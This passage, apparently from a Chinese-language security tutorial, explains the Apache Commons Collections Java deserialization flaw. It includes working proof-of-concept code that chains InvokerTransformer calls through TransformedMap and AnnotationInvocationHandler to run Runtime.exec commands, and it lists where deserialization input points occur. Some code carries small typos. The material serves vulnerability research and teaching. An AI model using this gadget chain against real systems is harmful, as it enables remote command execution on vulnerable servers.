        第二个参数为Map对象内的key要经过的转化方法（可为单个方法，也可为链，也可为空）
        第三个参数为Map对象内的value要经过的转化方法
**(2)Transformer接口**
    Defines a functor interface implemented by classes that transform one object into another.
    作用：接口于Transformer的类都具备把一个对象转化为另一个对象的功能
transform的源代码
我们可以看到该类接收一个对象，获取该对象的名称，然后调用了一个invoke反射方法。另外，多个Transformer还能串起来，形成ChainedTransformer。当触发时，ChainedTransformer可以按顺序调用一系列的变换。
下面是一些实现Transformer接口的类，箭头标注的是我们会用到的。
    ConstantTransformer
    把一个对象转化为常量，并返回。
    InvokerTransformer
    通过反射，返回一个对象
    ChainedTransformer
    ChainedTransformer为链式的Transformer，会挨个执行我们定义Transformer
Apache Commons Collections中已经实现了一些常见的Transformer，其中有一个可以
**通过Java的反射机制来调用任意函数** ，叫做InvokerTransformer，代码如下：
    public class InvokerTransformer implements Transformer, Serializable {
    ...
        /*
            Input参数为要进行反射的对象，
            iMethodName,iParamTypes为调用的方法名称以及该方法的参数类型
            iArgs为对应方法的参数
            在invokeTransformer这个类的构造函数中我们可以发现，这三个参数均为可控参数
        */
        public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
            super();
            iMethodName = methodName;
            iParamTypes = paramTypes;
            iArgs = args;
        }
        public Object transform(Object input) {
            if (input == null) {
                return null;
            }
            try {
                Class cls = input.getClass();
                Method method = cls.getMethod(iMethodName, iParamTypes);
                return method.invoke(input, iArgs);
            } catch (NoSuchMethodException ex) {
                throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' does not exist");
            } catch (IllegalAccessException ex) {
                throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
            } catch (InvocationTargetException ex) {
                throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' threw an exception", ex);
            }
        }
    }
只需要传入方法名、参数类型和参数，即可调用任意函数。
在这里，我们可以看到，先用ConstantTransformer()获取了Runtime类，接着反射调用getRuntime函数，再调用getRuntime的exec()函数，执行命令""。依次调用关系为：
Runtime --> getRuntime --> exec()
因此，我们要提前构造 ChainedTransformer链，它会按照我们设定的顺序依次调用Runtime,
getRuntime,exec函数，进而执行命令。正式开始时，我们先构造一个TransformeMap实例，然后想办法修改它其中的数据，使其自动调用tansform()方法进行特定的变换(即我们之前设定好的)
再理一遍：
    1)构造一个Map和一个能够执行代码的ChainedTransformer，
      2)生成一个TransformedMap实例
      3)利用MapEntry的setValue()函数对TransformedMap中的键值进行修改
      4)触发我们构造的之前构造的链式Transforme（即ChainedTransformer）进行自动转换
知识补充
    Map是java中的接口，Map.Entry是Map的一个内部接口。
    Map提供了一些常用方法，如keySet()、entrySet()等方法。
    keySet()方法返回值是Map中key值的集合；
    entrySet()的返回值也是返回一个Set集合，此集合的类型为Map.Entry。
    Map.Entry是Map声明的一个内部接口，此接口为泛型，定义为Entry。它表示Map中的一个实体（一个key-value对）。
    接口中有getKey(),getValue方法，可以用来对集合中的元素进行修改
我们可以实现这个思路
    public static void main(String[] args) throws Exception {
        //transformers: 一个transformer链，包含各类transformer对象（预设转化逻辑）的转化数组
        Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", 
                new Class[] {String.class, Class[].class }, new Object[] {
                "getRuntime", new Class[0] }),
            new InvokerTransformer("invoke", 
                new Class[] {Object.class, Object[].class }, new Object[] {
                null, new Object[0] }),
            new InvokerTransformer("exec", 
                new Class[] {String.class }, new Object[] {"calc.exe"})};
        //首先构造一个Map和一个能够执行代码的ChainedTransformer，以此生成一个TransformedMap
        Transformer transformedChain = new ChainedTransformer(transformers);
        Map innerMap = new hashMap();
        innerMap.put("1", "zhang");
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
        //触发Map中的MapEntry产生修改（例如setValue()函数
        Map.Entry onlyElement = (Entry) outerMap.entrySet().iterator().next();
        onlyElement.setValue("foobar");
        /*代码运行到setValue()时，就会触发ChainedTransformer中的一系列变换函数：
           首先通过ConstantTransformer获得Runtime类
           进一步通过反射调用getMethod找到invoke函数
           最后再运行命令calc.exe。
        */
    }
**思考**
目前的构造还需要依赖于Map中某一项去调用setValue() 怎样才能在调用readObject()方法时直接触发执行呢？
**更近一步**
我们知道，如果一个类的方法被重写，那么在调用这个函数时，会优先调用经过修改的方法。因此，如果某个可序列化的类重写了readObject()方法，并且在readObject()中对Map类型的变量进行了键值修改操作，且这个Map变量是可控的，我么就可以实现攻击目标。
于是，我们开始寻寻觅觅，终于，我们找到了~
**AnnotationInvocationHandler类**
    这个类有一个成员变量memberValues是Map类型 
    更棒的是，AnnotationInvocationHandler的readObject()函数中对memberValues的每一项调用了setValue()函数对value值进行一些变换。
这个类完全符合我们的要求，那么，我们的思路就非常清晰了
    1）首先构造一个Map和一个能够执行代码的ChainedTransformer，
      2）生成一个TransformedMap实例
      3）实例化AnnotationInvocationHandler，并对其进行序列化，
      4）当触发readObject()反序列化的时候，就能实现命令执行。
POC执行流程为 TransformedMap->AnnotationInvocationHandler.readObject()->setValue()-漏洞成功触发
我们回顾下所有用到的技术细节
    (1)java方法重写：如果一个类的方法被重写，那么调用该方法时优先调用该方法
    (2)JAVA反射机制：在运行状态中
                 对于任意一个类，都能够判断一个对象所属的类；
                 对于任意一个类，都能够知道这个类的所有属性和方法；
                  对于任意一个对象，都能够调用它的任意一个方法和属性；
    (3)认识关键类与函数
        TransformedMap ：      利用其value修改时触发transform()的特性
        ChainedTransformer： 会挨个执行我们定义的Transformer
        Transformer:                 存放我们要执行的命令
        AnnotationInvocationHandler：对memberValues的每一项调用了setValue()函数
具体实现
    import java.io.File;
    import java.io.FileInputStream;
    import java.io.FileNotFoundException;
    import java.io.FileOutputStream;
    import java.io.IOException;
    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    import java.lang.annotation.Retention;
    import java.lang.reflect.Constructor;
    import java.util.HashMap;
    import java.util.Map;
    import java.util.Map.Entry;
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.TransformedMap;
    public class POC_Test{
        public static void main(String[] args) throws Exception {
            //execArgs: 待执行的命令数组
            //String[] execArgs = new String[] { "sh", "-c", "whoami > /tmp/fuck" };
            //transformers: 一个transformer链，包含各类transformer对象（预设转化逻辑）的转化数组
            Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                /*
                由于Method类的invoke(Object obj,Object args[])方法的定义
                所以在反射内写new Class[] {Object.class, Object[].class }
                正常POC流程举例：
                ((Runtime)Runtime.class.getMethod("getRuntime",null).invoke(null,null)).exec("gedit");
                */
                new InvokerTransformer(
                    "getMethod",
                    new Class[] {String.class, Class[].class },
                    new Object[] {"getRuntime", new Class[0] }
                ),
                new InvokerTransformer(
                    "invoke",
                    new Class[] {Object.class,Object[].class }, 
                    new Object[] {null, null }
                ),
                new InvokerTransformer(
                    "exec",
                    new Class[] {String[].class },
                    new Object[] { "whoami" }
                    //new Object[] { execArgs } 
                )
            };
            //transformedChain: ChainedTransformer类对象，传入transformers数组，可以按照transformers数组的逻辑执行转化操作
            Transformer transformedChain = new ChainedTransformer(transformers);
            //BeforeTransformerMap: Map数据结构，转换前的Map，Map数据结构内的对象是键值对形式，类比于python的dict
            //Map BeforeTransformerMap = new HashMap();
            Map BeforeTransformerMap = new HashMap();
            BeforeTransformerMap.put("hello", "hello");
            //Map数据结构，转换后的Map
           /*
           TransformedMap.decorate方法,预期是对Map类的数据结构进行转化，该方法有三个参数。
                第一个参数为待转化的Map对象
                第二个参数为Map对象内的key要经过的转化方法（可为单个方法，也可为链，也可为空）
                第三个参数为Map对象内的value要经过的转化方法。
           */
            //TransformedMap.decorate(目标Map, key的转化对象（单个或者链或者null）, value的转化对象（单个或者链或者null）);
            Map AfterTransformerMap = TransformedMap.decorate(BeforeTransformerMap, null, transformedChain);
            Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
            ctor.setAccessible(true);
            Object instance = ctor.newInstance(Target.class, AfterTransformerMap);
            File f = new File("temp.bin");
            ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
            out.writeObject(instance);
        }
    }
    /*
    思路:构建BeforeTransformerMap的键值对，为其赋值，
         利用TransformedMap的decorate方法，对Map数据结构的key/value进行transforme
         对BeforeTransformerMap的value进行转换，当BeforeTransformerMap的value执行完一个完整转换链，就完成了命令执行
         执行本质: ((Runtime)Runtime.class.getMethod("getRuntime",null).invoke(null,null)).exec(.........)
         利用反射调用Runtime() 执行了一段系统命令, Runtime.getRuntime().exec()
    */
* * *
**漏洞挖掘**
    1.漏洞触发场景
       在java编写的web应用与web服务器间java通常会发送大量的序列化对象例如以下场景：
      1)HTTP请求中的参数，cookies以及Parameters。
      2)RMI协议，被广泛使用的RMI协议完全基于序列化
      4)JMX 同样用于处理序列化对象
      5)自定义协议 用来接收与发送原始的java对象
    2. 漏洞挖掘
      (1)确定反序列化输入点
        首先应找出readObject方法调用，在找到之后进行下一步的注入操作。一般可以通过以下方法进行查找：